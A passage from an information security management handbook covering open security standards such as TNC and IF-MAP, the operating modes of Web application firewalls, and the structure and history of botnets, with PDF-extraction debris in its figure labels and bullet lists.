have gotten markedly better on some fronts. The increasing adoption of Trusted 
Network Connect (TNC) standards should allow us to easily detect infected 
machines and raise the visibility from the edge. Microsoft’s move to include TNC 
support in Windows Vista and Windows XP SP 3 and their publication of hun-
dreds of Microsoft protocols on MSDN in early 2008 are positive moves that 
should be emulated by others. In Figure 5.2 you see a logical mapping of real world 
capabilities that have now been vetted in whole or part by the TNC, IETF, as well 
as large multi-national companies like Microsoft, Dell, Intel, Hewlett Packard, 
Symantec, and McAfee.
Creation
CoNoction
RIMM
Publication
Policy
authoring and
Distribution
Evaluation
Reference Integrity
Information
Source
(e.g. Manufacturers)
Component
Integrity Data
Published Integrity
Information
Reference Measurement
Authoritative
Source
RIMM
Database
Authoring
Policy
Database
Distribution
Runtime Measurement
RIMMs
and
Policies
Platform
Components
Platform
Platform
Measurement
TPM
Storage
Platform Storage
and TPM
Runtime
Integrity Information
AR
IMCs
TNCC
PTS
NAR
TNC Arch, Protocols
and PTS
Integrity Report
TNC Use-Case
TNC Arch and
Protocols
PDP
IMMs
TNCS
NAA
Figure 5.2  A logical mapping of real-world capabilities that have now been vet-
ted in whole or part by the TNC and the IETF.

Integrated Security through Open Standards  ◾  65
5.5  Standards, Triple Play: “Endpoints and 
Flowpoints and the Threat State Database”
The challenge of the “power at the edge, control at the center” mantra is in how 
and where we deploy our protections. The “Endpoints and Flowpoints” concept is 
a fairly generic way of describing a defense in depth or “Flex Defense” concept that 
can adapt as we go to solve the many and varied attacks that we will continue to see. 
The best way to think about this is that you cannot dam the Mississippi River but 
you can dam some tributaries while you watch the Mississippi. What that means is 
that as endpoints come on the network we need to be able to take postures on them 
that we can then correlate with policies and behaviors. There have been some recent 
fascinating developments in this area, both in proprietary products and through 
open standards like IF-MAP. This new standard allows a wide variety of network 
security systems (NAC, IDS, DLP, etc.) to coordinate and communicate critical 
information, building a “Threat State Database” that shows the status of all users, 
devices, and suspicious activity on the network (see Figure 5.3).
By sharing this information, suspicious activity can be correlated with users to 
identify abnormal behavior and take corrective action. This sort of correlation and 
communication among network security devices using open standards is long over-
due. Longer term, the standards-based participation of the endpoints themselves 
in the security of the network around them has to be carried forward in a way that 
they participate more in discerning what others are doing rather than being solely 
concerned with what they are doing locally. At every juncture we need to be watch-
ing what is going on in the network with tools like sFlow in switches, NetFlow in 
switches and routers, recently developing SDKs for switches and routers that allow 
for open-source innovation, and network visibility servers that can take in data to 
assist us in determining where we need to put our resources at any given point. 
While some of this has been around for a while, the deployment aspects of it have 
AR
PEP
PDP
Integrity
Measurement
Collectors
TNC
Client
Network
Access
Requestor
Supplicant
VPN Client etc.
Network
Access
Layer
Integrity
Evaluation
Layer
Integrity
Measurement
Layer
IFM
IFMC
IFMV
IFTNCCS
IFT
Policy
Enforcement
Point
Edge Switch
Access Firewall
VPN Gateway
IFPEP
Integrity
Measurement
Veriﬁes
TNC
Server
Network Access
Authority
IF-MAP
AAA Servers
MAP
Metadata
Access
Point
IF-MAP Server
Flow Controller,
Sensors, etc.
IF-MAP
Flow Controllers,
Sensor, etc.
IF-MAP
IF-MAP
IF-MAP
IDS, Interior
Firewalls, etc.
Figure 5.3  The logical makeup of one currently available set of standards that 
could be used as a foundation.

66  ◾  Information Security Management Handbook
just recently become a more complete picture as more and more companies seek 
to participate and are given that ability by the increased openness of many of the 
aspects of the community.
What we saw in the past with mostly signature based mechanisms was an over-
whelming of the networks ability to respond. Unlike the normal immune system in 
a human that generally only responds when a true threat exists, the various network 
visibility products in the past would simply inundate the security folks with warn-
ing after warning. It becomes the “boy that cried wolf” and then things simply 
begin to be ignored. In an analogy all of us can understand, we may respond to 
the first 5000 inconsequential Blackberry buzzes but that second 5000 have a high 
chance of not even raising an eyebrow. Instead we need to be looking at visibility 
points along the way that then can trigger responses that begin to capture a lot more 
information at the first hint of trouble. Distributing some of that open reporting 
capability all the way out to the endpoint is where I think we will go because while 
the endpoints have clients on them that protect them, many times the challenge 
is how the proprietary systems often treat as non-existent the warnings that come 
about violations that are not deemed critical. Host-based firewall data goes into the 
bit bucket from the view of the network as a whole, when it could possibly flow up 
into the centralized network visibility server to become part of an overlaid “Threat 
State Database”. The evolution of something like this could be enterprise first, and 
eventually could be shared if the communication aspects continue to open up over 
the next few years. The SETI model with thousands of individual clients partici-
pating in a grid working on the distributed task of searching for extra-terrestrial 
life makes a lot of sense going forward especially with the advent of technologies 
like Common Uniform Driver Architecture (CUDA) and the potential substantial 
extra processing power it brings. Looking at security in that light we can see open 
source clients (there are already several out there for various capabilities) that could 
then become individual sensors from a network data perspective. This type of dis-
tributed peer review could then become an indicator on the network that gives 
some idea of the danger level based on what the individual clients see around them 
more-so than actually what they see on them. It would not be a stretch to consider 
weighting this input based on what we acknowledge to be “known good” endpoints 
or beacon/buoy machines on the network. The end goal would be to attempt to be 
able to create a “Federated Security” concept that gives us a whole picture of our 
enterprise (even a fuzzy one at first) but that allows us to quickly focus the magnify-
ing glass when an area becomes a concern. (Robert Whiteley, Forrester Consulting) 
Eventually the feedback loop for the network needs to follow more along the con-
cept of Boyd’s Loop or OODA Loops which give us an overall more effective activ-
ity cycle than simply putting out fires. Refer back to Figure 5.3 for an illustration 
of the logical makeup of one currently available set of standards that could be used 
as a foundation for this next iteration of network capability.
Basically in this environment, we are watching the sampled data at different 
points in the system and as heuristics continue to evolve, we can decide whether or 

Integrated Security through Open Standards  ◾  67
not to focus the more intensive capabilities of the forensic aspect of that network 
on our trouble spots. With the proliferation of headless attack vectors like printers, 
iPods, and iPhones there has to be a way of distributing the load of the visibility so 
that we have early warning indicators before things overwhelm the core. It has been 
proven that core defense simply does not work because of the drastic increase in 
bandwidth coming from the edge, the huge liability located in the endpoint includ-
ing what data it sees and what it does with that data, and new valid “malware-like” 
software that serves valid business purposes while fraying the nerves of the security 
team. As we continue to move towards the evolution of more transient and distrib-
uted network security supplicants on these clients, we need to concern ourselves 
with network design that allows for the inclusion of this data in real time so that 
when it does get here we do not have to rip and replace yet again. Buying switches 
that are sFlow capable should be on the agenda while paying attention to both stan-
dards adherence in the past as well as roadmap postures for the future again comes 
to the forefront. Paying attention to how a router supports NetFlow and whether or 
not the company is really participating in the standards associated with communi-
cations in general should become a main criterion for our discussions. Recognizing 
how we are going to put that information to use and what we need to do in order to 
further the evolution of the industry needs to become a prime consideration if we 
are every to get ahead of the curve.
5.6  Standards: Why Do They Really 
Matter Going Forward?
Simple concept: require standards. Right? Well, yes in theory. When we just say 
it out loud it sounds not only simple, but effective, and just plain makes sense. At 
the same time what we have found throughout the evolution of this industry and 
our profession is that the evolution of standards is nearly the sole domain of the 
vendors. If you think that seems backwards then you are absolutely right. It goes 
directly back to both the “ninja monkeys” issue as well as the fact that the vendors 
have a ton of very smart people working for them. By no means am I saying that 
vendors are all evil, I am just saying that their goal is not an altruistic one by and 
large. Their goal, in most cases, is to make money for their business while doing no 
harm to the general public. That is a worthy goal and not one that I am condemn-
ing them for in the least. I am simply saying that it is not the goal of IT security , 
and awareness of their goals and objectives brings power to us and by the transitive 
property our organizations.
I wrote a brief column about this a few months back and will use some of that 
here because I have a real conviction about this topic (O’Berry, StateTech Magazine 
Jan/Feb 2008). I believe that what it really boils down to is that it is time for us to 
participate in maturation of the industry instead of just watching as it evolves. One 

68  ◾  Information Security Management Handbook
way to do that is to push vendors to abandon their proprietary technologies and 
demand they support open standards and frameworks. For the past decade, large 
companies have wagged the dog by manipulating, wasting time and, in general, 
simply not allowing the industry to standardize in a timely manner. Some of the 
largest vendors have opted out of standardization efforts in hopes of forcing people 
to choose their technology, thereby locking out competitors and locking in custom-
ers. Many might say this is a valid business practice, and in the past it might well 
have been, based solely on a dollars-and-cents perspective. That era has passed, and 
the future should belong to open, non-proprietary and scalable solutions because 
things are too important at this point to leave to simple market chance.
As mentioned above, security threats are evolving at an incredibly rapid pace 
today which leaves us no real time for a the old slow, painful, politics-filled stan-
dards process where the incumbent vendors drag their feet until they are forced to 
the table by market pressure. We have all witnessed the battles over standards such 
as OSPF, LLDP, IGMP, SMI-S, SFLOW, AVDL and most recently Cisco NAC 
/TCG TNC/IETF NEA and Microsoft NAP From these various struggles, we 
have become familiar with the concept of vendor lock-in and de-facto closed stan-
dards. Concurrently, the game and stakes have changed considerably for everyone 
involved and we are nearly overwhelmed at every turn by the complexity of han-
dling security in our heterogeneous environments. The above combination of fac-
tors creates a completely untenable situation for the entire “Digital Ecosystem” as a 
whole. It creates an environment where rapidly evolving user-driven open standards 
is possibly the only valid solution to step into the breach.
While the standards scenario is a seemingly obvious one, it has eluded our 
profession in many cases. What has instead happened in the past is at critical 
junctures where more pervasive open standards might take hold, threatened ven-
dors ramp up the attack and their engineers and sale people keep coming fast 
and furious. That causes some of us to feel powerless and therefore give up. Those 
casualties within the practitioners creates additional gaps based on the silos that 
they attempt to keep us in and then the pendulum swings even further against the 
practitioners as those left are fighting increasing odds against not only vendors, 
but the pundits that tend to push those vendors for money. What we fail to real-
ize is we do wield a great deal of influence if we band together. In my opinion, it 
is time to stand up as a profession with one voice and say to the vendors we sup-
port with our dollars, “Do what is right.” It is time to stand up and say that we 
will no longer allow the tail to wag the dog. At every juncture, we must demand 
aggressive support of open standards and push vendors to not only participate in 
organizations like The Open Group, OASIS, the Trusted Computing Group, and 
the IETF but to also openly embrace and really contribute to organizations like 
them. To find our voice, we need to break through the communication silos which 
have been built around us and find new ways to share ideas and concepts with one 
another. Those different mechanisms exist now in many fragmented forms and 
new ones like demandstands.org are coming with the goal of pulling the various 

Integrated Security through Open Standards  ◾  69
pieces together into some type of workable plan that will contribute to an overall 
global information system transformation.
In the meantime, we must question road maps and require that the vendors 
we choose to patronize are not only endorsing, but supporting and truly embrac-
ing open standards that will encourage the sharing of information, as well as the 
interoperability of heterogeneous pieces critical to our foundations. It is time for 
our profession to take a leadership role in our dealings with vendors and their 
products and interactions with one another. It is time for us to act before we are 
told we should do something by the very people who then want to sell us the tools 
to do it. It is time for a greater percentage of IT leaders to come from within the 
consumers of the technology rather than the purveyors. In order to do that we need 
to do our homework on each piece of our network to know what standards are 
necessary. In doing this we can take on various aspects of the product knowledge 
process collectively while making it clear what we will and will not stand for from 
the people we choose to do business with. At the same time, we need to consider 
stronger language in our contracts: “This procurement is contingent on adherence 
of this product to standard ‘x, y, z’ with the understanding that a lack of compliance 
by ‘such and such date’ will be grounds for a full refund of purchase price.” Why 
do we need to take such an aggressive posture? At this point we have ubiquitous 
access from a steadily multiplying number of devices with rapidly evolving threats 
that increase in both numbers and complexity every day. The attackers have revo-
lutionary new tools to deliver these threats. Considering all we are up against, we 
have no choice but to take issue with de-facto standards and large vendors whose 
opposition to open standards kills us from an agility perspective. To put this in 
perspective we need to look at the network access control market and think about 
how many years it has been since a valid standard with multiple vendors support-
ing it has been in place. It is more than two years and yet it is still an issue. Why? 
Again, old standards processes where large vendors drag their feet are simply not 
reasonable any longer and at times step in the way of us protecting the shareholders 
and customers for each organization. It will not be long before the issue of public 
trust rears its head which will at that point involve various governments stepping in 
and making life (by accident, of course) very difficult. Instead we need to get out 
ahead of that because the stakes are significantly higher now especially as it relates 
to data security. Before, standards adherence mostly centered on efficiency concerns 
but now it is systemic safety with each entity bearing a responsibility to the whole. 
That is a completely different level of responsibility and one that I do not believe 
vendors really want to truly acknowledge.
I briefly touched on the concept of “Endpoints and Flowpoints” and how with 
the incorporation of the new IF-MAP specification, we can really begin to have a 
valid shot to ingrain security as the network rapidly expands. We know the ways 
of the past simply did not scale and things had become nearly unmanageable with 
older technology. In order to move forward, adopting open standards based frame-
works will be one of the most effective and efficient ways to get an agile, scalable, 

70  ◾  Information Security Management Handbook
modular, distributed security architecture that is truly workable for the masses. 
Again, if we look at it with a human immune system concept in mind, basically we 
are all part of one organism in this digital ecosystem. Slow adoption and lip service 
to open standards, as previously mentioned, now not only affects efficiency, but 
also affects safety because if the extremities get an infection it can easily become 
systemic. While in the past we could just worry about the security of our organiza-
tions and even just the core of our organizations, this is no longer the case. Again, 
the practice of “Digital Feudalism” with the lords of the land retreating to their 
castles and pulling up the drawbridge while peering out from the throne room, has 
seemed potentially reasonable in the past. Now, not so much because we realize the 
barbarian hordes (botnets, etc.) really can and are drafting our peasants, dogs, cats, 
etc., into service for use against us.
5.7  Conclusion
Contemplate this question: When the vast majority of the digital ecosystem is 
owned or completely broken including the very drivers of the financial/economic 
food-chain, where will that leave the world as a whole?
Considering this question, and with everything I have written taken into con-
sideration, from a “state of standards” perspective, you have to now ask yourself: 
“Why does the tail continue to wag the dog?” Do we deal with it just because it’s 
always been this way? Are we going to let this state of existence continue? Can we 
afford to do that? From my perspective, that state of existence cannot and should 
not be acceptable going forward. Instead, as mentioned, a consolidated voice is 
required to make changes in how future critical standards evolve. Our future must 
include open security frameworks which allow plug-ins for innovation with rap-
idly evolving workable standards, not only requested but demanded. As individual 
practitioners we need to require legitimate road-maps, time-lines, and milestones 
for standards in the products we use, while contractually requiring adherence by 
specifying when we expect open standards compliance and what the consequences 
are for failing on that front. Keep in mind that this is not being difficult no mat-
ter what a vendor or business unit says, because more rapid adoption of standard 
security frameworks opens the door for innovation both in our profession as well 
as the business as a whole. Blind adherence to a mono-culture is neither feasible 
nor healthy going forward in any facet of our networks and businesses. Being in 
the security field, I am sure that those of you who have read this far realize that 
easier is not always better. Homogeneous is not practical at this point and each 
and every decision we make goes directly to the bottom line of our organizations, 
either positively or negatively. Our decisions are not made in a vacuum and there is 
no doubt that, in the future, things are likely to get tougher before they get better. 
With that in mind, we have to advance changes which matter at every opportunity 
we are given.

Integrated Security through Open Standards  ◾  71
There are a great number of things that I have either just briefly touched on here 
or simply not mentioned because to do so would extend way past the scope of this 
chapter. If you get nothing else from what I have written, then I hope that you real-
ize that the information security field has changed rapidly over the last few years 
mostly because of just how young it is in the scheme of society, and it requires a 
much different mindset when looking at implementation principles going forward. 
As a profession, we need to think outside the box about how we can begin to affect 
changes to the old way of operating. (Figure 5.4) Finally, we need to make sure we 
consider how we take things on, what we take on, how we lead, how we educate, 
how we drive, and then adhere to open standards, how we support groups like 
OASIS, The Open Group, and TCG, and how we support concepts like demand-
standards.org while clarifying what we absolutely require of vendors.. It is a tall 
order but one that I know we can fill if we communicate and support one another 
irrespective of old roles, titles, and predispositions going forward.


73
6
Chapter 
Web Application Firewalls
Georges J. Jahchan
6.1  Introduction
According to the Web Application Security Consortium (WASC), a Web appli-
cation firewall (WAF) is defined as “an intermediary device, sitting between a 
Web client and a Web server, analyzing OSI layer-7 messages for violations in 
the programmed security policy. A Web application firewall is used as a security 
device protecting the Web server from attack,” and Web application security is 
defined as “theory and practice of information security relating to the World 
Wide Web, HTTP, and Web application software. It is also known as Web 
security.”*
Furthermore, WASC classifies WAF as “a new breed of information security 
technology designed to protect Websites from attack. WAF solutions are capable of 
preventing attacks that network firewalls and intrusion detection systems can’t, and 
they do not require modification of application source code.”†
In this chapter, we will push the concept of WAF to “protect the informa-
tion processed by Web applications from Web-based attacks,” present some typi-
*	http://www.webappsec.org/projects/glossary/v1/wasc_glossary_02262004.pdf
†	 http://www.webappsec.org/projects/wafec/
Contents
6.1	 Introduction................................................................................................73
6.2	 The Security Layers.....................................................................................74
6.3	 WAF Operating Modes...............................................................................76

74  ◾  Information Security Management Handbook
cal information security requirement scenarios, and analyze available technology 
control options for securing the information.
6.2  The Security Layers
Figures 6.1, 6.2, and 6.3 illustrate in a rather simplistic form the security layers 
of an information system and the typical generic class of controls used to secure 
each layer.
S 
e 
c 
 
I 
n 
f 
o 
r 
m 
a 
t 
i 
o 
n 
 
M 
g 
m 
t 
Physical
Network
Host
Web Application
Information
Physical Security Controls 
Network Security Controls 
Packet Filtering/IDS/IPS 
Host Security Controls 
O/S Hardening, Access Controls
Web Application 
Security Policy Requirements 
Security Operations Center 
  - Automated Real-time Monitoring 
  - Automated Compliance Reporting 
Figure 6.1 
S 
e 
c 
 
I 
n 
f 
o 
r 
m 
a 
t 
i 
o 
n 
Web Server
Web Application
Database
Information
Web Application 
Firewalls
Not considered for the 
purposes of this chapter
Security Policy Requirements 
Figure 6.2 

Web Application Firewalls  ◾  75
The Web application could be further divided into sub-layers: Web server, Web 
application (front end) and Web application back end (typically a database) that has 
direct access to the information.
In an effort to gain a competitive edge, organizations are increasingly offering 
to partners and customers direct access to information. Because data is to be made 
selectively accessible to external parties, a new dimension is to be added to the Web 
application security: authentication and authorization. It is no longer just needed 
to protect Web server and Web application from hacks and abuse (which is where 
WAFs come in), but, in addition, organizations need to restrict external parties’ 
access to data, based on who they are and on what the security policy allows them 
to do.
Authentication and authorization mechanisms could be hard coded into the 
application, but a better method of control is to set up Web access control (WAC) 
in front of the Web service. WAC may or may not be as good as WAF at protecting 
the Web application against compromise, but it has the potential effectively and 
efficiently to control who has access to what information, and to maintain an audit 
trail for compliance reporting or security monitoring purposes.
In Figure 6.3, whenever a client requests a page (), the request is first inter-
cepted by the agent. The agent parses the request and determines the rule(s) that 
apply to the requested access based on stored policy. If the requested page is pro-
tected and requires authentication, the agent presents the user with a log-in page 
and forwards the user’s credentials and access request to the policy server (). The 
policy server forwards user credentials to the authentication server (). The authen-
tication server validates user credentials and informs the policy server (). The 
policy server creates an audit trail and sends back to the agent an “access allowed” 
message (). Only then does the real Web server receive the request from the agent 
(), and serves the page back to the client through the agent ( and ).
Auth 
Server 
Policy 
Server 
Web 
Client 
Agent 
Web 
Application 
Log 
 
 
 
Figure 6.3 

76  ◾  Information Security Management Handbook
In the logical data flow, the real Web server does not receive the client request until 
the user has been authenticated, the request authorized, and an audit trail created.
Separating security from the application has several advantages:
The security policy is enforced uniformly across multiple platforms and 
◾
◾
applications.
A single policy server can manage hundreds of agents with flexible policies. 
◾
◾
An audit trail of changes to policies is maintained by the policy server.
Because authentication is external, flexible authentication mechanisms can 
◾
◾
be used and multilevel security can be enforced. The security policy can spec-
ify not only whether authentication is required, but also what authentication 
method or combination of methods is required to validate the user. In an 
e-business environment, the authentication method can be based not only on 
the type of tran­saction, but also on transaction variables such as the dollar 
value of the transaction.
Security monitoring and compliance reporting are greatly facilitated by a 
◾
◾
centralized log.
Auditors no longer need to look at the security mechanisms embedded inside 
◾
◾
appli­cations, with each application using different mechanisms.
6.3  WAF Operating Modes
Web application firewalls can be operated in passive or active (in line) mode. Active 
mode can be
A transparent bridge that fails to open (such as Imperva SecureSphere).
◾
◾
Routing, which requires network reconfiguration.
◾
◾
Reverse proxy, which requires traffic redirection via DNS or at the network 
◾
◾
level (Big-IP NetContinuum, or ModSecurity for Apache).
Embedded as a Web server plug-in with varying degrees of reliance on the 
◾
◾
Web server (ModSecurity for Apache).
A passive WAF link to the Web server through a hub or a mirrored port on 
◾
◾
a switch.
In high-volume/low-latency production environments, passive firewalls may 
not act fast enough to block an identified attack.

77
7
Chapter 
Botnets
Robert M. Slade*
7.1  Introduction
A botnet is a network of automated systems or processes (robots or bots) performing 
a specific function. In other words, a botnet is a form of distributed processing or 
computing. There is one other aspect: a botnet is dedicated to some form of mali-
cious activity.
*	Copyright Robert M. Slade.
Contents
7.1	 Introduction............................................................................................... 77
7.2	 Structure.....................................................................................................78
7.2.1	 Automation......................................................................................78
7.2.2	 Distribution.....................................................................................80
7.3	 History........................................................................................................81
7.3.1	 Denial of Service.............................................................................81
7.3.1.1	 Shoch and Hupp Worm.....................................................82
7.3.1.2	 Winnuke Trojan, June 1997..............................................82
7.3.2	 Command and Control...................................................................83
7.3.2.1	 “Smurf” and “Fraggle”......................................................83
7.3.2.2	 Spambotnet Wars of 2003................................................ 84
7.3.2.3	 Storm................................................................................ 84
7.4	 Protection....................................................................................................85
References and Further Reading...........................................................................85

78  ◾  Information Security Management Handbook
In one sense, there is nothing new about botnets. Distributed computing has 
been explored for some time, and there are various systems that are using it to 
great effect. On the malware side there is little new that has not been done over 
the past 20 years. However, the conflation of these two ideas has taken the mal-
ware threat to unprecedented levels. Botnets have greatly magnified the power 
and speed of malicious operations, and have allowed for tuning and directing 
of operations in a way that was not possible with viral programs alone. The 
distributed nature of botnets and related technologies such as fast-flux domain 
and IP address reassignment (rapidly rotating domain names and IP addresses) 
have made it much more difficult to detect, analyze, and remove botnets and 
botnet activity.
7.2  Structure
7.2.1  Automation
Botnets are composed of bots, which is where the automation comes in. “Bot,” an 
abbreviation of robot, is the term used for automated agent software, programmed 
to perform a specific task without the originator having to be directly involved 
at all times. This is, of course, nothing new for computers: many programs were 
designed to run unattended, and there are a great many programs and utilities run 
as services or daemons. These applications, however, are generally passive and wait 
for requests, whereas some bots may be more active, such as the spidering software 
that is used in building and maintaining Web search engine databases. Outside of 
botnets, the most familiar usage of the term “bot” is probably in IRC (Internet relay 
chat) where automated programs were created to perform utility functions such as 
assisting new users, creating the appearance of activity, monitoring unacceptable 
language, or simply holding the moderator privileges for a channel while the opera-
tor was offline. Originally, bots were generally beneficial, and the term “bot” is 
generally held to be neutral even now, whereas botnets are defined as malicious.
Bots and Malicious Automation
It is difficult to trace a straightforward history of botnets because 
they are a convergence of a variety of technologies. IRC con-
tributed much more than the name to botnets. In the late 1990s, 
malicious scripts appeared in IRC channels. Some were sim-
plistic viruses, merely designed to spread. Shortly, these came 
to include additional scripting with malicious functions such as 
the ability to enable technologies that could be used for further 
attacks, or the creation of accounts with escalated privileges. 

Botnets  ◾  79
Eventually, the attacks could install and control services on the 
machines of unsuspecting users. Similar concepts are used in 
the botnets of today.
Bots were, however, not simply an IRC phenomenon. 
Multiuser games and other computer-based role playing envi-
ronments had similar bots and automated attacks.
Bot agent software can be installed on user machines in any number of ways. 
Trojan horse programs may be mailed, and users incited, or socially engineered, to 
infect their own machines. This may or may not be associated with a virus carrier. 
Worms may examine machines for server software with specific vulnerabilities. 
Drive-by downloads, peer-to-peer file sharing software, and instant messaging cli-
ents all have functions that may allow remote submission of files and invocation 
of commands or programs. Once any of these methods can be made to work, any 
further desired software may be placed on the user machine and set in operation. 
Generally speaking, once botnet software has been installed on the infected 
machine, it no longer requires personal intervention by the bot herder, but will 
respond to automated communications through the command and control channel 
directed at a number of computers in the botnet. Latterly, this includes promotion 
into, and demotion out of, the control channel itself.
For simplicity’s sake I am referring to a bot herder in terms of a single indi-
vidual. Note that this is not necessarily the case. Whereas in the early days of bot-
nets a single individual, or small group, would publicize and distribute the remote 
access Trojan software, evaluate and collect infected machines, and launch mali-
cious attacks, in recent operations specialists may be involved at different stages. 
Multiple handlers may maintain an active botnet (including subdividing the com-
puters into groups for particular operations), and multiple attackers may make use 
of the botnet, or portions thereof, sometimes simultaneously.
A botnet is not simply a set of computers that have somehow “gone rogue.” 
Botnets are built by individuals or groups known as bot herders. Bots or remote 
access Trojans (RATs) are installed on computers. The software installation is 
frequently via Trojan horse programs (which may be distributed as attachments 
via e-mail viruses, or built into them), drive-by downloads (which take advan-
tage of vulnerabilities in browsers or permissions left open by the user whenever 
the user visits a Website with certain active content), or even by worms. Once 
a RAT or bot has been installed on a computer, it will communicate with the 
bot herder, announcing its availability, and may then be commanded to down-
load additional software, or to start to perform a function. Command and con-
trol of botnets was originally done simply through reasonably anonymous IRC 
channels (Web or e-mail based interactions allowed tracing of the bot herder or 
disruption of control). Recently, a wide variety of techniques has been created 

80  ◾  Information Security Management Handbook
to provide for command and control, as well as avoidance of detection and dis-
ruption of the control channels. A bot-infected machine may now become part 
of the command structure or part of a system designed to frustrate attempts to 
trace the structure.
Malicious Control
The issue of obtaining unauthorized control of a computer sys-
tem, generally remotely, is one of the earlier concerns in regard 
to information security, possibly predated only by the fear of 
unauthorized disclosure of sensitive information. Certainly, 
access control increased significantly in importance once 
remotely accessible systems became more widespread. There 
were earlier cases than those written up by Clifford Stoll in The 
Cuckoo’s Egg, but Stoll documented the functions very well, 
and in a particularly entertaining manner.
Initially, intruders would connect to computer systems and 
use existing accounts (or create new ones for use) directly. 
Over time, blackhats learned to submit materials that could 
invoke processes or functions and generate effects and out-
comes without the need to log on to the system.
7.2.2  Distribution
Botnets are networks of computers, increasing the performance of the payload that 
can be delivered. Using multiple computers multiplies the power of attacks that can 
be submitted or the processing that can be applied to an exploit or analysis. In addi-
tion, if individual machines are discovered to be part of a botnet and the agent, bot, 
or zombie software removed, the botnet as a whole continues to operate.
Botnets may consist of thousands, or in some cases even millions, of machines. 
Estimates of the size of certain botnets that were studied during 2007 indicated the 
possibility of tens of millions of machines, resulting in computing power that could 
rival that of supercomputers.
In March 2008, a threat analysis firm announced an estimate that 40 percent of 
the 800 million computers connected to the Internet have some involvement with 
botnets. Later research questioned the early approximations, and it is fairly certain 
that the botnets were actually much smaller. However, the possibility remains.
The power of botnets is not limited to processing. The individual machines 
involved in botnets all have communications connections. With the enormous 
numbers of computers taking part, even low-bandwidth channels can become a 
formidable vehicle for information transfer, and for attack as well.

Botnets  ◾  81
The fact that multiple machines are involved also makes detection of the indi-
vidual machines more difficult. A stand-alone machine involved in a network flood-
ing attack will be identifiable because of the stream of packets originating from it, 
even if forged. A machine engaged in a botnet flooding attack may send only a few 
packets at a time, with the effect of the attack multiplied thousands of times by the 
multiple machines dedicated to the assault.
Because of the distributed nature of botnets, early efforts against them concen-
trated on taking down the command and control structures. In response, new dis-
tributed methods of command and control have been evolved by the bot herders.
7.3  History
7.3.1  Denial of Service
In late December 1967, a computer operator on a network of machines used by the 
government and military of the United States found a paper tape of a text picture of 
the Peanuts cartoon character Snoopy, surrounded by falling snowflakes. He felt that 
this would be a nice Christmas greeting to others on the network, and sent it to an 
address for “broadcast all.” The technology for the network was based on teletype 
machines (hence the paper tape), but even with the 30 to 50 baud rates applicable 
at the time, a two-page text image should have completed in less than five minutes. 
However, two hours later the transmission was still only one third of the way through 
the image. The operator did not know the extent of the network. His image file was 
being broadcast worldwide, even to some machines in the White House and Viet 
Nam. In addition, the networking technology had not yet developed the layering that 
was later implemented in TCP/IP, and immediately checked for a confirmation of 
every character broadcast to every machine, which resulted in the long transmission 
time. Roughly two hours into the broadcast, a user from another office came in to 
check whether this particular terminal was the one initiating the broadcast: manually 
checking each station was the only way to determine the origin. The broadcast was, 
in fact, ensuring that no other work could be sent over the network. This was, very 
possibly, the first instance of a network denial of service (DoS) attack.
(It turned out that there was no possible technical solution to this problem; the 
only way to rectify such a broadcast storm was for the originator to terminate the 
transmission. While the network was still in operation, a policy was established 
that only the chief operator was allowed to use the “broadcast all” address.)
The concept of DoS was fictionally articulated by author Larry Niven in a 1971 
novella entitled Flash Crowd. This story explores the problems inherent in a new 
transportation technology that allows anyone to teleport to any location on earth, 
immediately and with minimal cost. In an era of mass communication, mention of 
a location in a popular travelogue or news of an unusual event results in masses of 
people flooding to a given location, often overwhelming local resources. This is the 

82  ◾  Information Security Management Handbook
pattern of network denial of service: a flood of requests or packets of a specific type 
to a particular host ensures some form of resource exhaustion and the unavailability 
of that machine for its intended purpose.
In 2007, there was a rather tragic analogy in the real world. Aviator Steve Fossett 
failed to return from a flight over the Nevada desert. “Crowdsourcing” was used to 
request volunteers to search both physically and in aerial images available online. 
Unfortunately, this created a very large number of false leads, all of which had to 
be investigated.
7.3.1.1  Shoch and Hupp Worm
One of the very earliest examples of a local area network (LAN) was implemented 
at the Xerox Palo Alto Research Center. As well as being useful for the types of 
business functions common on LANs today, it was a testbed for the development 
of those functions and experiments with others. John Shoch and Jon Hupp, two 
researchers there at the time, were interested in the concept of distributed process-
ing—the ability of computers to work cooperatively on single or related tasks.
The specific experimental program they were testing was one that would exam-
ine other computers on the network to look for activity. If a computer was idle after 
normal working hours, for example, the program would submit a copy of itself to the 
idle machine. In this way, the original program would spawn multiple copies of itself 
to idle machines to make use of the CPU time that would otherwise go to waste. The 
intention was to write programs that would be aimed at solving problems normally 
submitted to a supercomputer. By breaking the problem down into small chunks, 
each capable of solution on one of the machines on the network, you would, in effect, 
have a large program consisting of small program segments working on individual 
machines. Because biological worms are defined by the fact that they have segmented 
bodies, they called this new type of program a “worm.” Alas, the experiment was not 
an unqualified success. One night, a programming error caused the computers to 
which the worm program had been submitted to “hang.” Given that the program had 
been submitted to a great many computers over the course of the night, employees 
arrived in the morning to find an institution full of dead computers. This program 
became known in many references as the “infamous Xerox worm.”
(It is interesting to note this as the probable origin of the term for a program that 
replicates from computer to computer by itself, generally over a network. Shoch and 
Hupp were not interested in security or attacks as such, but rather in experimenting 
with distributed computing concepts. Currently, the term “worm” is known solely 
in terms of malicious software.)
7.3.1.2  Winnuke Trojan, June 1997
The Urgent Pointer is a rarely used field in the TCP header, which indicates data 
in the TCP stream that should be processed quickly by the recipient. In the late 

Botnets  ◾  83
1990s, Microsoft Windows 95, Windows NT, and Windows 3.1x computer oper-
ating systems didn’t handle the Urgent Pointer field correctly. A stream of packets 
sent to TCP port 139, which was reserved for Microsoft’s NetBIOS protocol, with 
the Urgent Pointer set would lock up the computer. This would not allow an intru-
sion, and would not damage or disclose saved files, but it did deny service on the 
target machine.
A person under the screen name “_eci” published C source code for the exploit 
on June 7, 1997, which caused considerable anguish until a security patch was 
released. The exploit and attack were used in a variety of ways, from graphically 
oriented, precompiled attack programs for attacking a single computer, to scripts 
that would systematically go through IRC channels, attacking each participant.
7.3.2  Command and Control
In the earliest days of botnets, IRC was the command and control channel of choice. 
IRC provided a one-to-many communications channel that did not require either 
that the attacker contact each machine individually, or that the infected comput-
ers regularly establish a connection with a central location, such as a Web server, 
for instructions. IRC also provided a measure of anonymity for the attacker or bot 
herder. A system of codes or passwords could be used to ensure that the bot herder 
retained control of the botnet without losing it to someone else.
Even in those early days bot herders might use the botnet itself as part of the 
control channel. Early vintage bot software might install an IRC server itself on 
the controlled computer to prevent a channel from being shut down when it was 
discovered that botnet commands were being sent in that manner.
IRC is far from the only control channel that can be used. Peer-to-peer (P2P) 
networking and file transfer systems have the same decentralization and anony-
mization functions that made IRC so suitable, as well as built-in functions that 
can be used for updating and access to new systems. Instant messaging is another 
